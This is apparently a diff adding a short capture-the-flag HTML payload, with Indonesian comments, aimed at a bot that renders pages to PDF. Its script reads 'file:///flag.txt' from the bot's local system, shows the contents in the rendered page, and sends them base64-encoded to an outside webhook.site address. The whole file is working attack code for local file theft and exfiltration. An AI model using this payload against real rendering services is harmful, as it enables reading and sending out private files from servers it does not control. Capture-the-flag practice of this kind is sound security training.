@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Tunggu sebentar, Bartender sedang meracik...</h1>
+    <script>
+        // Mencoba mengambil flag dari sistem lokal bot
+        fetch('file:///flag.txt')
+            .then(response => response.text())
+            .then(data => {
+                // Opsi 1: Tampilkan di layar agar muncul di PEEK.pdf
+                document.body.innerHTML = "<h1>FLAG: " + data + "</h1>";
+                
+                // Opsi 2: Kirim ke server luar (Webhook.site) untuk jaga-jaga
+                fetch('https://webhook.site/YOUR-ID?flag=' + btoa(data));
+            })
+            .catch(err => {
+                document.body.innerHTML = "Error: " + err;
+            });
+    </script>
+</body>
+</html>
